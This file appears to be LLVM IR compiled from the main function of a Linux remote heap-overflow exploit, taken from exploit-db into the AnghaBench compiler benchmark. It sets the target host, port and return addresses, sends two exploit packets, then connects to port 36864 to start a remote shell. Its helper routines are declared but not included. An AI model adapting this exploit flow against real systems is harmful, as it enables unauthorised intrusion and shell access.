; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_33.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_33.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }

@__const.main.hostname = private unnamed_addr constant [130 x i8] c"x82.inetcop.org\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__pl_form = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [25 x i8] c"T:t:R:r:S:s:H:h:P:p:IiXx\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = external dso_local global i8*, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c" Try `%s -?' for more information.\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"x82.inetcop.org\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c" [+] Hostname: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c" [+] Port num: %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c" [+] Retloc address: %p\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c" [+] Retaddr address: %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c" [1] #1 Set socket.\0A\00", align 1
@.str.8 = private unnamed_addr constant [34 x i8] c" [2] First, send exploit packet.\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c" [3] #2 Set socket.\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c" [4] Second, send exploit packet.\0A\00", align 1
@.str.11 = private unnamed_addr constant [43 x i8] c" [5] Waiting, executes the shell ! (3Sec)\0A\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c" [6] Trying %s:%d ...\0A\00", align 1
@.str.13 = private unnamed_addr constant [28 x i8] c" [7] Connected to %s:%d !\0A\0A\00", align 1
@ATK_CPT = common dso_local global i32 0, align 4
@D_HOST = common dso_local global i8* null, align 8
@D_PORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [130 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 8000, i32* %8, align 4
  %14 = bitcast [130 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([130 x i8], [130 x i8]* @__const.main.hostname, i32 0, i32 0), i64 130, i1 false)
  store i32 0, i32* %11, align 4
  %15 = load %struct.TYPE_2__*, %struct.TYPE_2__** @__pl_form, align 8
  %16 = load i32, i32* %11, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %15, i64 %17
  %19 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %18, i32 0, i32 1
  %20 = load i32, i32* %19, align 4
  store i32 %20, i32* %12, align 4
  %21 = load %struct.TYPE_2__*, %struct.TYPE_2__** @__pl_form, align 8
  %22 = load i32, i32* %11, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* %13, align 4
  %27 = call i32 (...) @__xpl_banrl()
  br label %28

28:                                               ; preds = %86, %2
  %29 = load i32, i32* %4, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = call i32 @getopt(i32 %29, i8** %30, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  store i32 %31, i32* %10, align 4
  %32 = load i32, i32* @EOF, align 4
  %33 = icmp ne i32 %31, %32
  br i1 %33, label %34, label %87

34:                                               ; preds = %28
  %35 = load i32, i32* %10, align 4
  switch i32 %35, label %86 [
    i32 84, label %36
    i32 116, label %36
    i32 82, label %59
    i32 114, label %59
    i32 83, label %62
    i32 115, label %62
    i32 72, label %65
    i32 104, label %65
    i32 80, label %71
    i32 112, label %71
    i32 73, label %74
    i32 105, label %74
    i32 63, label %81
  ]

36:                                               ; preds = %34, %34
  %37 = load i8*, i8** @optarg, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %11, align 4
  %39 = icmp slt i32 %38, 6
  br i1 %39, label %40, label %53

40:                                               ; preds = %36
  %41 = load %struct.TYPE_2__*, %struct.TYPE_2__** @__pl_form, align 8
  %42 = load i32, i32* %11, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %41, i64 %43
  %45 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i32 0, i32 1
  %46 = load i32, i32* %45, align 4
  store i32 %46, i32* %12, align 4
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @__pl_form, align 8
  %48 = load i32, i32* %11, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  store i32 %52, i32* %13, align 4
  br label %58

53:                                               ; preds = %36
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @x_fp_rm_usage(i8* %56)
  br label %58

58:                                               ; preds = %53, %40
  br label %86

59:                                               ; preds = %34, %34
  %60 = load i8*, i8** @optarg, align 8
  %61 = call i32 @strtoul(i8* %60, i32* null, i32 0)
  store i32 %61, i32* %12, align 4
  br label %86

62:                                               ; preds = %34, %34
  %63 = load i8*, i8** @optarg, align 8
  %64 = call i32 @strtoul(i8* %63, i32* null, i32 0)
  store i32 %64, i32* %13, align 4
  br label %86

65:                                               ; preds = %34, %34
  %66 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %67 = call i32 @memset(i8* %66, i32 0, i32 130)
  %68 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %69 = load i8*, i8** @optarg, align 8
  %70 = call i32 @strncpy(i8* %68, i8* %69, i32 129)
  br label %86

71:                                               ; preds = %34, %34
  %72 = load i8*, i8** @optarg, align 8
  %73 = call i32 @atoi(i8* %72)
  store i32 %73, i32* %8, align 4
  br label %86

74:                                               ; preds = %34, %34
  %75 = load i32, i32* @stderr, align 4
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %78)
  %80 = call i32 @exit(i32 -1) #4
  unreachable

81:                                               ; preds = %34
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @x_fp_rm_usage(i8* %84)
  br label %86

86:                                               ; preds = %34, %81, %71, %65, %62, %59, %58
  br label %28

87:                                               ; preds = %28
  %88 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %89 = call i32 @strcmp(i8* %88, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %96, label %91

91:                                               ; preds = %87
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @x_fp_rm_usage(i8* %94)
  br label %96

96:                                               ; preds = %91, %87
  %97 = load i32, i32* @stdout, align 4
  %98 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %99 = call i32 (i32, i8*, ...) @fprintf(i32 %97, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i8* %98)
  %100 = load i32, i32* @stdout, align 4
  %101 = load i32, i32* %8, align 4
  %102 = call i32 (i32, i8*, ...) @fprintf(i32 %100, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i32 %101)
  %103 = load i32, i32* @stdout, align 4
  %104 = load i32, i32* %12, align 4
  %105 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %104)
  %106 = load i32, i32* @stdout, align 4
  %107 = load i32, i32* %13, align 4
  %108 = call i32 (i32, i8*, ...) @fprintf(i32 %106, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i32 %107)
  %109 = load i32, i32* @stdout, align 4
  %110 = call i32 (i32, i8*, ...) @fprintf(i32 %109, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %111 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %112 = load i32, i32* %8, align 4
  %113 = call i64 @sexsock(i8* %111, i32 %112)
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %6, align 4
  %115 = load i32, i32* %6, align 4
  %116 = call i32 @re_connt_lm(i32 %115)
  %117 = load i32, i32* @stdout, align 4
  %118 = call i32 (i32, i8*, ...) @fprintf(i32 %117, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.8, i64 0, i64 0))
  %119 = load i32, i32* %6, align 4
  %120 = load i32, i32* %12, align 4
  %121 = load i32, i32* %13, align 4
  %122 = call i64 @__eat_sucks_heap_data_send(i32 %119, i32 %120, i32 %121)
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %6, align 4
  %124 = load i32, i32* %6, align 4
  %125 = call i32 @close(i32 %124)
  %126 = load i32, i32* @stdout, align 4
  %127 = call i32 (i32, i8*, ...) @fprintf(i32 %126, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %128 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %129 = load i32, i32* %8, align 4
  %130 = call i64 @sexsock(i8* %128, i32 %129)
  %131 = trunc i64 %130 to i32
  store i32 %131, i32* %6, align 4
  %132 = load i32, i32* %6, align 4
  %133 = call i32 @re_connt_lm(i32 %132)
  %134 = load i32, i32* @stdout, align 4
  %135 = call i32 (i32, i8*, ...) @fprintf(i32 %134, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  %136 = load i32, i32* %6, align 4
  %137 = load i32, i32* %12, align 4
  %138 = load i32, i32* %13, align 4
  %139 = call i64 @__eat_sucks_heap_data_send(i32 %136, i32 %137, i32 %138)
  %140 = trunc i64 %139 to i32
  store i32 %140, i32* %6, align 4
  %141 = load i32, i32* @stdout, align 4
  %142 = call i32 (i32, i8*, ...) @fprintf(i32 %141, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.11, i64 0, i64 0))
  %143 = call i32 @sleep(i32 3)
  %144 = load i32, i32* @stdout, align 4
  %145 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i64 0, i64 0), i8* %145, i32 36864)
  %147 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %148 = call i64 @sexsock(i8* %147, i32 36864)
  %149 = trunc i64 %148 to i32
  store i32 %149, i32* %7, align 4
  %150 = load i32, i32* %7, align 4
  %151 = call i32 @re_connt_lm(i32 %150)
  %152 = load i32, i32* @stdout, align 4
  %153 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %154 = call i32 (i32, i8*, ...) @fprintf(i32 %152, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.13, i64 0, i64 0), i8* %153, i32 36864)
  %155 = load i32, i32* %7, align 4
  %156 = call i32 @start_shell(i32 %155)
  %157 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @__xpl_banrl(...) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @x_fp_rm_usage(i8*) #2

declare dso_local i32 @strtoul(i8*, i32*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strcmp(i8*, i8*) #2

declare dso_local i64 @sexsock(i8*, i32) #2

declare dso_local i32 @re_connt_lm(i32) #2

declare dso_local i64 @__eat_sucks_heap_data_send(i32, i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @start_shell(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
